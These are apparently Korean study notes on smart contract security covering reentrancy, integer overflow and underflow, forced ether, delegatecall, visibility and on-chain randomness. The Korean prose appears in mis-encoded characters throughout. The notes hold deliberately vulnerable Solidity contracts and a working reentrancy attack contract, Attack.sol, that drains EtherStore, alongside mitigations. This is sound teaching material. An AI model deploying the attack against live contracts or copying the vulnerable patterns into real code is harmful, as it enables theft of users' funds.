# Chapter 9. ë³´ì•ˆ(ìƒ)

# 1. ë³´ì•ˆ ëª¨ë²”ì‚¬ë¡€

## 1-1. ðŸ›  ë°©ì–´ì  í”„ë¡œê·¸ëž˜ë°

- **ë¯¸ë‹ˆë©€ë¦¬ì¦˜/ ë‹¨ìˆœì„±**

    ë‹¨ìˆœí•˜ê³  ê°„ê²°í•´ì•¼ ì‹¤ìˆ˜ë¥¼ ì•ˆí•œë‹¤

- **ì½”ë“œ ìž¬ì‚¬ìš©**

    DRY(Don't Repeat Yourself) 

    ê´‘ë²”ìœ„í•˜ê²Œ ì‚¬ìš©ë˜ëŠ” ì½”ë“œëŠ” ìƒˆ ì½”ë“œë³´ë‹¤ ì•ˆì „í•˜ë‹¤

- **ì½”ë“œ í’ˆì§ˆ**

    ìš°ì£¼ê³µí•™ ìˆ˜ì¤€ìœ¼ë¡œ ì‹¤ìˆ˜ê°€ ìš©ë‚©ë˜ì§€ ì•ŠëŠ”ë‹¤, ì½”ë“œ ë°°í¬ â‡’ ë¬¸ì œ í•´ê²° ë°©ë²•ì´ ì—†ìŒ

- **ê°€ë…ì„±/ê°ì‚¬ ìš©ì´ì„±**

    ì½”ë“œê°€ ëª…í™•í•˜ê³  ì´í•´í•˜ê¸° ì‰¬ì›Œì•¼í•œë‹¤

- **í…ŒìŠ¤íŠ¸ ë²”ìœ„**

    í•  ìˆ˜ ìžˆëŠ” ëª¨ë“  ê²ƒì„ í…ŒìŠ¤íŠ¸í•˜ë¼


# 2. ë³´ì•ˆ ìœ„í—˜ ë° ì•ˆí‹°íŒ¨í„´

**ê°€ìž¥ ê³µí†µì ì¸ ë³´ì•ˆ ìœ„í—˜ì— ìµìˆ™í•´ì•¼í•œë‹¤.**


# 3. âš ï¸ìž¬ì§„ìž…ì„±

- ìŠ¤ë§ˆíŠ¸ ì»¨íŠ¸ëž™íŠ¸ì˜ íŠ¹ì§• ì¤‘ í•˜ë‚˜ëŠ” ë‹¤ë¥¸ ì™¸ë¶€ ì»¨íŠ¸ëž™íŠ¸ì˜ ì½”ë“œë¥¼ í˜¸ì¶œí•˜ê³  í™œìš©í•  ìˆ˜ ìžˆëŠ” ëŠ¥ë ¥
- ì´ëŸ° ìž‘ì—…ì„ ì•…ìš©, ì½œë°±ì„ í¬í•¨í•˜ì—¬ ëŒ€ì²´ ì½”ë“œë¥¼ ì‹¤í–‰í•˜ë„ë¡ ê°•ì œí•  ìˆ˜ ìžˆìŒ(í´ë°± í•¨ìˆ˜ë¥¼ í†µí•´)

[Reentrancy Attack On Smart Contracts: How To Identify The Exploitable And An Example Of An Attack...](https://bit.ly/2zaqSEY)

## 3-1. â˜ ï¸ì·¨ì•½ì 

- ìž¬ì§„ìž…ì„± ê³µê²©ì€ ì»¨íŠ¸ëž™íŠ¸ê°€ ì•Œ ìˆ˜ ì—†ëŠ” ì£¼ì†Œë¡œ ì´ë”ë¥¼ ì „ì†¡í•  ë•Œ ë°œìƒí•  ìˆ˜ ìžˆë‹¤.
- 'ìž¬ì§„ìž…(reentrancy)'ì€ ì™¸ë¶€ì˜ ì•…ì˜ì ì¸ ì»¨íŠ¸ëž™íŠ¸ê°€ ì·¨ì•½í•œ ì»¨íŠ¸ëž™íŠ¸ì˜ í•¨ìˆ˜ë¥¼ í˜¸ì¶œí•˜ê³  ì½”ë“œ ì‹¤í–‰ ê²½ë¡œê°€ ê·¸ ì•ˆìœ¼ë¡œ 'ìž¬ì§„ìž…í•œë‹¤'ëŠ” ì‚¬ì‹¤ì—ì„œ ë¹„ë¡¯ëœ ê²ƒì´ë‹¤.

Example 1. EtherStore.sol

```tsx
contract EtherStore {

    uint256 public withdrawalLimit = 1 ether;
    mapping(address => uint256) public lastWithdrawTime;
    mapping(address => uint256) public balances;

    function depositFunds() external payable {
        balances[msg.sender] += msg.value;
    }

    function withdrawFunds (uint256 _weiToWithdraw) public {
        require(balances[msg.sender] >= _weiToWithdraw);
        // limit the withdrawal
        require(_weiToWithdraw <= withdrawalLimit);
        // limit the time allowed to withdraw
        require(now >= lastWithdrawTime[msg.sender] + 1 weeks);
        require(msg.sender.call.value(_weiToWithdraw)());
        balances[msg.sender] -= _weiToWithdraw;
        lastWithdrawTime[msg.sender] = now;
    }
 }
```

Example 2. Attack.sol

```tsx
import "EtherStore.sol";

contract Attack {
  EtherStore public etherStore;

  // intialize the etherStore variable with the contract address
  constructor(address _etherStoreAddress) {
      etherStore = EtherStore(_etherStoreAddress);
  }

  function attackEtherStore() external payable {
      // attack to the nearest ether
      require(msg.value >= 1 ether);
      // send eth to the depositFunds() function
      etherStore.depositFunds.value(1 ether)();
      // start the magic
      etherStore.withdrawFunds(1 ether);
  }

  function collectEther() public {
      msg.sender.transfer(this.balance);
  }

  // fallback function - where the magic happens
  function () payable {
      if (etherStore.balance > 1 ether) {
          etherStore.withdrawFunds(1 ether);
      }
  }
}
```

## 3-2. ðŸ”’ì˜ˆë°©ê¸°ë²•

- transfer ë‚´ìž¥ í•¨ìˆ˜ë¥¼ ì´ìš©, ì „ì†¡ì— ì¶©ë¶„í•˜ì§€ ì•Šì€ ì ì€ ì–‘ì˜ ê°€ìŠ¤ë§Œ ë³´ë‚´ë„ë¡ ì²˜ë¦¬(ìž¬ì§„ìž… ë§‰ê¸°)
- ì´ë”ê°€ ì „ì†¡ë˜ê¸° ì „ì— ìƒíƒœ ë³€ìˆ˜ë¥¼ ë³€ê²½í•˜ëŠ” ë¡œì§ì„ ë‹¤ ì•žìœ¼ë¡œ ê°€ì ¸ì˜¨ë‹¤ â‡’ ì•Œ ìˆ˜ ì—†ëŠ” ì£¼ì†Œë¡œ ë³´ë‚´ëŠ” ì™¸ë¶€ í˜¸ì¶œ ì½”ë“œëŠ” ê°€ìž¥ ë§ˆì§€ë§‰ ìž‘ì—…ì´ ë˜ë„ë¡ í•˜ëŠ”ê²Œ ë°”ëžŒì§
- ë®¤í…ìŠ¤ ë„ìž…

Let them all get into it

```tsx
contract EtherStore {

    // initialize the mutex
    bool reEntrancyMutex = false;
    uint256 public withdrawalLimit = 1 ether;
    mapping(address => uint256) public lastWithdrawTime;
    mapping(address => uint256) public balances;

    function depositFunds() external payable {
        balances[msg.sender] += msg.value;
    }

    function withdrawFunds (uint256 _weiToWithdraw) public {
        require(!reEntrancyMutex);
        require(balances[msg.sender] >= _weiToWithdraw);
        // limit the withdrawal
        require(_weiToWithdraw <= withdrawalLimit);
        // limit the time allowed to withdraw
        require(now >= lastWithdrawTime[msg.sender] + 1 weeks);
        balances[msg.sender] -= _weiToWithdraw;
        lastWithdrawTime[msg.sender] = now;
        // set the reEntrancy mutex before the external call
        reEntrancyMutex = true;
        msg.sender.transfer(_weiToWithdraw);
        // release the mutex after the external call
        reEntrancyMutex = false;
    }
 }
```

## 3-3. ðŸ—£ï¸ì‹¤ì œ ì‚¬ë¡€: DAO

- DAOê³µê²©ì€ ì´ë”ë¦¬ì›€ì˜ ì´ˆê¸° ê°œë°œì—ì„œ ë°œìƒí•œ ì£¼ìš” í•´í‚¹ ì¤‘ í•˜ë‚˜ë¡œ, ìž¬ì§„ìž…ì€ ê·¸ ê³µê²©ì—ì„œ ì¤‘ìš”í•œ ì—­í• ì„ í–ˆìœ¼ë©° ê¶ê·¹ì ìœ¼ë¡œëŠ” ì´ë”ë¦¬ì›€ í´ëž˜ì‹ì„ ë§Œë“  í•˜ë“œ í¬í¬ë¡œ ì´ì–´ì¡Œë‹¤.


# 4. âš ï¸ì‚°ìˆ  ì˜¤ë²„í”Œë¡œ/ì–¸ë”í”Œë¡œ

ì´ë”ë¦¬ì›€ ê°€ìƒ ë¨¸ì‹ ì€ ì •ìˆ˜ë“¤ì— ëŒ€í•´ ê³ ì •ëœ í¬ê¸°ì˜ ë°ì´í„° íƒ€ìž…ì„ ì§€ì •í•œë‹¤. ì‚¬ìš©ìž ìž…ë ¥ì„ ì ê²€í•˜ì§€ ì•Šê³  ê³„ì‚°ì„ ìˆ˜í–‰í•˜ë©´ ì €ìž¥í•˜ëŠ” ë°ì´í„°ì˜ ìœ í˜•ì´ ë²”ìœ„ë¥¼ ë²—ì–´ë‚˜ëŠ” ìˆ«ìžê°€ ë  ìˆ˜ ìžˆì–´ ì†”ë¦¬ë””í‹° ë³€ìˆ˜ë¥¼ ì•…ìš©í•  ìˆ˜ ìžˆë‹¤

## 4-1. â˜ ï¸ì·¨ì•½ì 

- ë³€ìˆ˜ì˜ ë°ì´í„° íƒ€ìž… ë²”ìœ„ë¥¼ ë²—ì–´ë‚˜ëŠ” ìˆ«ìž(ë˜ëŠ” ë°ì´í„°)ë¥¼ ê³ ì • í¬ê¸° ë³€ìˆ˜ì— ì €ìž¥í•´ì•¼ í•˜ëŠ” ì—°ì‚°ì´ ìˆ˜í–‰ë˜ë©´ ì˜¤ë²„í”Œë¡œ/ì–¸ë”í”Œë¡œê°€ ë°œìƒí•œë‹¤.

ì˜¤ë²„í”Œë¡œìš° ì˜ˆì‹œ

```jsx
contract TimeLock {

    mapping(address => uint) public balances;
    mapping(address => uint) public lockTime;

    function deposit() external payable {
        balances[msg.sender] += msg.value;
        lockTime[msg.sender] = now + 1 weeks;
    }

    function increaseLockTime(uint _secondsToIncrease) public {
        lockTime[msg.sender] += _secondsToIncrease;
    }

    function withdraw() public {
        require(balances[msg.sender] > 0);
        require(now > lockTime[msg.sender]);
        uint transferValue = balances[msg.sender];
        balances[msg.sender] = 0;
        msg.sender.transfer(transferValue);
    }
}
```

ì–¸ë”í”Œë¡œ ì˜ˆì‹œ

```jsx
pragma solidity ^0.4.18;

contract Token {

  mapping(address => uint) balances;
  uint public totalSupply;

  function Token(uint _initialSupply) {
    balances[msg.sender] = totalSupply = _initialSupply;
  }

  function transfer(address _to, uint _value) public returns (bool) {
    require(balances[msg.sender] - _value >= 0);
    balances[msg.sender] -= _value;
    balances[_to] += _value;
    return true;
  }

  function balanceOf(address _owner) public constant returns (uint balance) {
    return balances[_owner];
  }
}
```

## 4-2. ðŸ”’ì˜ˆë°©ê¸°ë²•

**í‘œì¤€ ìˆ˜í•™ ì—°ì‚°ìžì¸ ë”í•˜ê¸°, ë¹¼ê¸°, ê³±ì…ˆì„ ëŒ€ì²´í•˜ëŠ” ìˆ˜í•™ ë¼ì´ë¸ŒëŸ¬ë¦¬ë¥¼ ì‚¬ìš©í•˜ê±°ë‚˜ ë§Œë“œëŠ” ê²ƒ**

```jsx
library SafeMath {

  function mul(uint256 a, uint256 b) internal pure returns (uint256) {
    if (a == 0) {
      return 0;
    }
    uint256 c = a * b;
    assert(c / a == b);
    return c;
  }

  function div(uint256 a, uint256 b) internal pure returns (uint256) {
    // assert(b > 0); // Solidity automatically throws when dividing by 0
    uint256 c = a / b;
    // assert(a == b * c + a % b); // This holds in all cases
    return c;
  }

  function sub(uint256 a, uint256 b) internal pure returns (uint256) {
    assert(b <= a);
    return a - b;
  }

  function add(uint256 a, uint256 b) internal pure returns (uint256) {
    uint256 c = a + b;
    assert(c >= a);
    return c;
  }
}

contract TimeLock {
    using SafeMath for uint; // use the library for uint type
    mapping(address => uint256) public balances;
    mapping(address => uint256) public lockTime;

    function deposit() external payable {
        balances[msg.sender] = balances[msg.sender].add(msg.value);
        lockTime[msg.sender] = now.add(1 weeks);
    }

    function increaseLockTime(uint256 _secondsToIncrease) public {
        lockTime[msg.sender] = lockTime[msg.sender].add(_secondsToIncrease);
    }

    function withdraw() public {
        require(balances[msg.sender] > 0);
        require(now > lockTime[msg.sender]);
        uint256 transferValue = balances[msg.sender];
        balances[msg.sender] = 0;
        msg.sender.transfer(transferValue);
    }
}
```

## 4-3. ðŸ—£ï¸ì‹¤ì œ ì‚¬ë¡€: PoWHC ë° ì¼ê´„ ì „ì†¡ ì˜¤ë²„í”Œë¡œ

ì°¸ê³ ë¡œ 866ì´ë”ê°€ ì»¨íŠ¸ëž™íŠ¸ì—ì„œ ìœ ì¶œ....ðŸ‘¼ðŸ»


# 5. âš ï¸ì˜ˆê¸°ì¹˜ ì•Šì€ ì´ë”

ì¼ë°˜ì ìœ¼ë¡œëŠ” ì´ë”ê°€ ì»¨íŠ¸ëž™íŠ¸ì— ì „ë‹¬ë  ë•Œ í´ë°± í•¨ìˆ˜ë‚˜ ì»¨íŠ¸ëž™íŠ¸ì— ì •ì˜ëœ ë˜ ë‹¤ë¥¸ í•¨ìˆ˜ë¥¼ ì‹¤í–‰í•´ì•¼ í•˜ëŠ”ë°, ì–´ë–¤ ì½”ë“œë¥¼ ì‹¤í–‰í•˜ì§€ ì•Šê³  ì»¨íŠ¸ëž™íŠ¸ ë‚´ì— ì´ë”ê°€ ì¡´ìž¬í•  ìˆ˜ ìžˆëŠ” ê²½ìš°ì—ëŠ” ì˜ˆì™¸ê°€ ì¡´ìž¬

## 5-1. â˜ ï¸ì·¨ì•½ì 

ì´ë”ê°€ payable í•¨ìˆ˜ë¥¼ ì‚¬ìš©í•˜ê±°ë‚˜ ì»¨íŠ¸ëž™íŠ¸ì—ì„œ ì½”ë“œë¥¼ ì‹¤í–‰í•˜ì§€ ì•Šê³  ì»¨íŠ¸ëž™íŠ¸ì— (ê°•ì œì ìœ¼ë¡œ) ë³´ë‚´ì§ˆ ìˆ˜ ìžˆëŠ” ë‘ ê°€ì§€ ë°©ë²•ì´ ìžˆë‹¤. 

- **ìžê¸°íŒŒê´´(self-destruct/suicide)**ì•„ë¬´ ê³µê²©ìžë‚˜ `self-destruct` í•¨ìˆ˜ë¥¼ ê°€ì§„ ì»¨íŠ¸ëž™íŠ¸ë¥¼ ë§Œë“¤ê³ , ì—¬ê¸°ì— ì´ë”ë¥¼ ë³´ë‚¸ ë‹¤ìŒ, `self-destruct`(target)ì„ í˜¸ì¶œí•´ì„œ target ì»¨íŠ¸ëž™íŠ¸ì— ê°•ì œë¡œ ì´ë”ë¥¼ ë³´ë‚¼ ìˆ˜ ìžˆë‹¤.
- **ë¯¸ë¦¬ ë³´ë‚´ì§„ ì´ë”**ì»¨íŠ¸ëž™íŠ¸ê°€ ìƒì„±ë˜ê¸° ì „ì— ì»¨íŠ¸ëž™íŠ¸ì˜ ì£¼ì†Œë¥¼ ê³„ì‚°í•  ìˆ˜ ìžˆê³ , ê·¸ë ‡ê¸° ë•Œë¬¸ì— ë¯¸ë¦¬ ê³„ì‚°ëœ ì£¼ì†Œë¡œ ì´ë”ë¥¼ ë³´ë‚¼ ìˆ˜ ìžˆë‹¤.

```jsx
contract EtherGame {

    uint public payoutMileStone1 = 3 ether;
    uint public mileStone1Reward = 2 ether;
    uint public payoutMileStone2 = 5 ether;
    uint public mileStone2Reward = 3 ether;
    uint public finalMileStone = 10 ether;
    uint public finalReward = 5 ether;

    mapping(address => uint) redeemableEther;
    // Users pay 0.5 ether. At specific milestones, credit their accounts.
    function play() external payable {
        require(msg.value == 0.5 ether); // each play is 0.5 ether
        uint currentBalance = this.balance + msg.value;
        // ensure no players after the game has finished
        require(currentBalance <= finalMileStone);
        // if at a milestone, credit the player's account
        if (currentBalance == payoutMileStone1) {
            redeemableEther[msg.sender] += mileStone1Reward;
        }
        else if (currentBalance == payoutMileStone2) {
            redeemableEther[msg.sender] += mileStone2Reward;
        }
        else if (currentBalance == finalMileStone ) {
            redeemableEther[msg.sender] += finalReward;
        }
        return;
    }

    function claimReward() public {
        // ensure the game is complete
        require(this.balance == finalMileStone);
        // ensure there is a reward to give
        require(redeemableEther[msg.sender] > 0);
        uint transferValue = redeemableEther[msg.sender];
        redeemableEther[msg.sender] = 0;
        msg.sender.transfer(transferValue);
    }
 }
```

## 5-2. ðŸ”’ì˜ˆë°©ê¸°ë²•

- ì´ëŸ¬í•œ ì¢…ë¥˜ì˜ ì·¨ì•½ì ì€ ì¼ë°˜ì ìœ¼ë¡œ this.balanceì˜ ê³µê²©ìœ¼ë¡œ ë°œìƒ.ì—¬ê¸°ì„œ `depositedEther`ë¼ëŠ” ìƒˆë¡œìš´ ë³€ìˆ˜ë¥¼ ë§Œë“¤ì–´ ìž…ê¸ˆëœ ì´ë”ë¥¼ ì¶”ì í•˜ê³  í…ŒìŠ¤íŠ¸í•˜ëŠ” ë° ì‚¬ìš©

ì±…ì— ìž˜ëª»ë‚˜ì˜´ depositedEther(x)  â†’ depositedWei (o) ë¼ëŠ” ë³€ìˆ˜ë¥¼ ë§Œë“¤ì–´ ì¶”ì 

```jsx
contract EtherGame {

    uint public payoutMileStone1 = 3 ether;
    uint public mileStone1Reward = 2 ether;
    uint public payoutMileStone2 = 5 ether;
    uint public mileStone2Reward = 3 ether;
    uint public finalMileStone = 10 ether;
    uint public finalReward = 5 ether;
    uint public depositedWei;

    mapping (address => uint) redeemableEther;

    function play() external payable {
        require(msg.value == 0.5 ether);
        uint currentBalance = depositedWei + msg.value;
        // ensure no players after the game has finished
        require(currentBalance <= finalMileStone);
        if (currentBalance == payoutMileStone1) {
            redeemableEther[msg.sender] += mileStone1Reward;
        }
        else if (currentBalance == payoutMileStone2) {
            redeemableEther[msg.sender] += mileStone2Reward;
        }
        else if (currentBalance == finalMileStone ) {
            redeemableEther[msg.sender] += finalReward;
        }
        depositedWei += msg.value;
        return;
    }

    function claimReward() public {
        // ensure the game is complete
        require(depositedWei == finalMileStone);
        // ensure there is a reward to give
        require(redeemableEther[msg.sender] > 0);
        uint transferValue = redeemableEther[msg.sender];
        redeemableEther[msg.sender] = 0;
        msg.sender.transfer(transferValue);
    }
 }
```


# 6. DELEGATECALL

`CALL`ê³¼ `DELEGATECALL` ì—°ì‚°ì½”ë“œëŠ” ì´ë”ë¦¬ì›€ ê°œë°œìžê°€ ì½”ë“œë¥¼ ëª¨ë“ˆí™”í•  ìˆ˜ ìžˆê²Œ í•˜ëŠ” ë° ìœ ìš©í•œë°, `DELEGATECALL` ì„ ì‚¬ìš©í•˜ë©´ ì˜ˆê¸°ì¹˜ ì•Šì€ ì½”ë“œê°€ ì‹¤í–‰ë  ìˆ˜ ìžˆë‹¤.

ë³´ë„ˆìŠ¤: call ê³¼ degatecall ì˜ ì°¨ì´ëž€?

- ì¤‘ìš” í¬ì¸íŠ¸â— `DELEGATECALL`  ê²½ìš° `msg.sender` ì™€ `msg.value`ê°€ ìœ ì§€ëœë‹¤

[[ethereum] solidity - call, delegatecall](https://m.blog.naver.com/pjt3591oo/221405662828)

## 6-1. â˜ ï¸ì·¨ì•½ì 

- ìš°ë¦¬ê°€ `DELEGATECALL` ì´ ìƒíƒœë¥¼ ë³´ì¡´í•œë‹¤ê³  ë§í•  ë•Œ ê·¸ê²ƒì€ ì»¨íŠ¸ëž™íŠ¸ì˜ ë³€ìˆ˜ ì´ë¦„ì´ ì•„ë‹ˆë¼ ê·¸ ì´ë¦„ì´ ê°€ë¦¬í‚¤ëŠ” ì‹¤ì œ ìŠ¤í† ë¦¬ì§€ ìŠ¬ë¡¯ì— ëŒ€í•´ ë§í•˜ê³  ìžˆìŒì„ ì•Œì•„ì•¼ í•œë‹¤.
- ê°„ë‹¨í•œ ì‹¤ìˆ˜ë¡œ ê³µê²©ìžê°€ ì „ì²´ ì»¨íŠ¸ëž™íŠ¸ì™€ í•´ë‹¹ ì´ë”ë¥¼ ê°€ë¡œ ì±Œ ìˆ˜ ìžˆë‹¤.

## 6-2. ðŸ”’ì˜ˆë°©ê¸°ë²•

- ì†”ë¦¬ë””í‹°ëŠ” ë¼ì´ë¸ŒëŸ¬ë¦¬ ì»¨íŠ¸ëž™íŠ¸ë¥¼ êµ¬í˜„í•˜ê¸° ìœ„í•œ í‚¤ì›Œë“œë¥¼ ì œê³µ
- ìŠ¤í…Œì´íŠ¸ë¦¬ìŠ¤(stateless)ë¡œ ë§Œë“¤ë©´ ì„¤ëª…í•˜ëŠ” ìŠ¤í† ë¦¬ì§€ ì»¨í…ìŠ¤íŠ¸ì˜ ë³µìž¡ì„±ì„ ì™„í™”
- ë˜í•œ ë¹„ìžê¸°íŒŒê´´ì ìž„ì„ ë³´ìž¥

## 6-3. ðŸ—£ï¸ ì‹¤ì œ ì‚¬ë¡€: íŒ¨ë¦¬í‹° ë©€í‹°ì‹œê·¸ ì§€ê°‘(ë‘ ë²ˆì§¸ í•´í‚¹)

ë¼ì´ë¸ŒëŸ¬ë¦¬ ì½”ë“œê°€ ì˜ë„ëœ ì»¨íƒìŠ¤íŠ¸ ì™¸ë¶€ì—ì„œ ì‹¤í–‰ë  ê²½ìš° ì–´ë–»ê²Œ ì•…ìš©ë  ìˆ˜ ìžˆëŠ”ì§€ ë³´ì—¬ì£¼ëŠ” ì˜ˆ

[Parity Multisig Hacked. Again](https://medium.com/chain-cloud-company-blog/parity-multisig-hack-again-b46771eaa838)

[An In-Depth Look at the Parity Multisig Bug](https://hackingdistributed.com/2017/07/22/deep-dive-parity-bug/)


# 7. ë””í´íŠ¸ ê°€ì‹œì„±

ê°€ì‹œì„±ì€ ì‚¬ìš©ìžê°€ í•¨ìˆ˜ë¥¼ ì™¸ë¶€ì—ì„œ í˜¸ì¶œí•  ìˆ˜ ìžˆëŠ”ì§€, ë‹¤ë¥¸ íŒŒìƒ ì»¨íŠ¸ëž™íŠ¸ê°€ í•¨ìˆ˜ë¥¼ ë‚´ë¶€ì—ì„œë§Œ ë˜ëŠ” ì™¸ë¶€ì—ì„œë§Œ í˜¸ì¶œí•  ìˆ˜ ìžˆëŠ”ì§€ ì—¬ë¶€ë¥¼ ê²°ì •í•œë‹¤.í•¨ìˆ˜ëŠ” ê¸°ë³¸ì ìœ¼ë¡œ publicì´ë©° ì‚¬ìš©ìžê°€ ì™¸ë¶€ì—ì„œ í˜¸ì¶œí•  ìˆ˜ ìžˆë‹¤.

## 7-1. â˜ ï¸ì·¨ì•½ì 

- ê°€ì‹œì„± ì§€ì •ìžì˜ ìž˜ëª»ëœ ì‚¬ìš©ì´ ìŠ¤ë§ˆíŠ¸ ì»¨íŠ¸ëž™íŠ¸ì—ì„œ ì¹˜ëª…ì ì¸ ì·¨ì•½ì ì„ ì´ˆëž˜í•œë‹¤.ê°œë°œìžê°€ ì‹¤ìˆ˜ë¡œ privateí•¨ìˆ˜ì— ëŒ€í•œ ê°€ì‹œì„± ì§€ì •ìžë¥¼ ìƒëžµí•˜ë©´ ë¬¸ì œê°€ ë°œìƒí•œë‹¤.

```jsx
contract HashForEther {

    function withdrawWinnings() {
        // Winner if the last 8 hex characters of the address are 0
        require(uint32(msg.sender) == 0);
        _sendWinnings();
     }

     function _sendWinnings() {
         msg.sender.transfer(this.balance);
     }
}
```

## 7-2. ðŸ”’ì˜ˆë°©ê¸°ë²•

- í•¨ìˆ˜ê°€ ì˜ë„ì ìœ¼ë¡œ publicì´ë¼ê³  í• ì§€ë¼ë„ ì»¨íŠ¸ëž™íŠ¸ì˜ ëª¨ë“  í•¨ìˆ˜ì— ëŒ€í•œ ê°€ì‹œì„±ì„ í•­ìƒ ì§€ì •í•˜ëŠ” ê²ƒì´ ì¢‹ë‹¤.

## 7-3. ðŸ—£ï¸ì‹¤ì œ ì‚¬ë¡€: íŒ¨ë¦¬í‹° ë©€í‹°ì‹œê·¸ ì§€ê°‘(ì²« ë²ˆì§¸ í•´í‚¹)

3100 ì´ë”ê°€ íŒ¨ë¦¬í‹° ë©€í‹°ì‹œê·¸ í•´í‚¹ìœ¼ë¡œ ë„ë‚œ ë‹¹í–ˆê³  ê·¸ì§€ ê°™ê² ë‹¤


# 8. ì—”íŠ¸ë¡œí”¼(ë¬´ìž‘ìœ„-ë¶ˆí™•ì‹¤ì„±?) í™˜ìƒ

ì´ë”ë¦¬ì›€ ë¸”ë¡ì²´ì¸ì˜ ëª¨ë“  íŠ¸ëžœìž­ì…˜ì€ ê²°ì •ë¡ ì  ìƒíƒœ ì „ì´ ì—°ì‚°ì´ë‹¤.ëª¨ë“  íŠ¸ëžœìž­ì…˜ì´ ì´ë”ë¦¬ì›€ ìƒíƒœê³„ì˜ ì „ì²´ ìƒíƒœë¥¼ ë¶ˆí™•ì‹¤ì„± ì—†ì´ ê³„ì‚° ê°€ëŠ¥í•œ ë°©ì‹ìœ¼ë¡œ ë³€ê²½í•œë‹¤ëŠ” ê²ƒì„ ì˜ë¯¸ ì´ë”ë¦¬ì›€ì—ì„œ ì—”íŠ¸ë¡œí”¼ ë˜ëŠ” ë¬´ìž‘ìœ„ì„±ì˜ ê·¼ì›ì´ ì—†ë‹¤ëŠ” ê·¼ë³¸ì ì¸ í•¨ì¶•ì„±ì„ ì§€ë‹ˆê³  ìžˆë‹¤

## 8-1. â˜ ï¸ì·¨ì•½ì 

- ì´ë”ë¦¬ì›€ í”Œëž«í¼ì„ ê¸°ë°˜ìœ¼ë¡œ êµ¬ì¶•ëœ ìµœì´ˆì˜ ì»¨íŠ¸ëž™íŠ¸ ì¤‘ ì¼ë¶€ëŠ” ë„ë°•ì„ ê¸°ë°˜í•œë‹¤.
- ì¼ë°˜ì ì¸ í•¨ì •ì€ ë¯¸ëž˜ì˜ ë¸”ë¡ ë³€ìˆ˜, ì¦‰ í•´ì‹œ, íƒ€ìž„ìŠ¤íƒ¬í”„, ë¸”ë¡ ë²ˆí˜¸ ë˜ëŠ” ê°€ìŠ¤ í•œë„ ê°™ì€, ê°’ì´ ì•„ì§ ì•Œë ¤ì§€ì§€ ì•Šì€ íŠ¸ëžœìž­ì…˜ ë¸”ë¡ì— ëŒ€í•œ ì •ë³´ë¥¼ í¬í•¨í•˜ëŠ” ë³€ìˆ˜ë¥¼ ì‚¬ìš©í•˜ëŠ” ê²ƒì´ë‹¤.
- ê·¸ëŸ¬ë‚˜ ë¸”ë¡ì€ ì´ë¥¼ ì±„êµ´í•˜ëŠ” ì±„êµ´ìžê°€ í†µì œí•˜ê³  ìžˆìœ¼ë©°, ê·¸ë ‡ê¸° ë•Œë¬¸ì— ê¶ê·¹ì ì¸ ë¬´ìž‘ìœ„ ê°’ì´ ë  ìˆ˜ ì—†ë‹¤ëŠ” ì ì— ë¬¸ì œê°€ ìžˆë‹¤.
- ex ) ë¸”ëž™ìž­, ë£°ë ›ë“±ì„ êµ¬í˜„í•œ ì»¨íŠ¸ëž™íŠ¸ê°€ í•´ì‰¬ê°’ì„ ì§ìˆ˜ë¡œ í–ˆì„ë•Œ ê²€ì€ìƒ‰, í™€ìˆ˜ëŠ” ë¹¨ê°„ìƒ‰
ëˆ„êµ°ê°€ëŠ” ë°°íŒ…í•˜ê³  ì±„êµ´ìž ë˜ëŠ” ì±„êµ´ìž í’€ì—ì„œëŠ” í•´ë‹¹ ë¸”ë¡ì„ í’€ì–´ì•¼í•˜ëŠ”ë° ìž„ì˜ë¡œ ë¸”ë¡ì„ ê²Œì‹œí•˜ì§€ ì•Šì„ ìˆ˜ ìžˆë‹¤

## 8-2. ðŸ”’ì˜ˆë°©ê¸°ë²•

- ì—”íŠ¸ë¡œí”¼(ë¬´ìž‘ìœ„ì„±)ì˜ ì›ì²œì€ ë¸”ë¡ì²´ì¸ ì™¸ë¶€ì— ìžˆì–´ì•¼ í•œë‹¤. ë¸”ë¡ ë³€ìˆ˜ëŠ” ì±„êµ´ìžê°€ ì¡°ìž‘í•  ìˆ˜ ìžˆìœ¼ë¯€ë¡œ ì—”íŠ¸ë¡œí”¼ì˜ ì›ì²œìœ¼ë¡œ ì‚¬ìš©í•˜ë©´ ì•ˆëœë‹¤.


# 9. ì™¸ë¶€ ì»¨íŠ¸ëž™íŠ¸ ì°¸ê³ 

ì´ë”ë¦¬ì›€ 'ì›”ë“œ ì»´í“¨í„°'ëŠ” ê²°ê³¼ì ìœ¼ë¡œ ë§Žì€ ìˆ˜ì˜ ì»¨íŠ¸ëž™íŠ¸ê°€ ëŒ€ê°œ ì™¸ë¶€ ë©”ì‹œì§€ í˜¸ì¶œì„ í†µí•´ ì™¸ë¶€ ì»¨íŠ¸ëž™íŠ¸ë¥¼ ì°¸ê³ í•œë‹¤. ì´ëŸ¬í•œ ì™¸ë¶€ ë©”ì‹œì§€ í˜¸ì¶œì€ ì•…ì˜ì ì¸ í–‰ìœ„ìžì˜ ì˜ë„ë¥¼ ëª‡ ê°€ì§€ ëª¨í˜¸í•œ ë°©ë²•ìœ¼ë¡œ ìˆ¨ê¸¸ ìˆ˜ ìžˆë‹¤.

## 9-1. â˜ ï¸ì·¨ì•½ì 

ì†”ë¦¬ë””í‹°ì—ì„œëŠ” ì–´ë–¤ ì£¼ì†Œë“ ì§€ ì»¨íŠ¸ëž™íŠ¸ë¡œ ìºìŠ¤íŠ¸í•  ìˆ˜ ìžˆëŠ”ë°, í•´ë‹¹ ì£¼ì†Œì— ìžˆëŠ” ì½”ë“œê°€ ì‹¤ì œ ì»¨íŠ¸ëž™íŠ¸ë¥¼ í‘œí˜„í•˜ê³  ìžˆëŠ”ì§€ ì—¬ë¶€ì™€ëŠ” ìƒê´€ì—†ë‹¤. ì´ë¡œ ì¸í•´ íŠ¹ížˆ ì»¨íŠ¸ëž™íŠ¸ ìž‘ì„±ìžê°€ ì•…ì„± ì½”ë“œë¥¼ ìˆ¨ê¸°ë ¤ê³  í•  ë•Œ ë¬¸ì œê°€ ë°œìƒí•  ìˆ˜ ìžˆë‹¤.

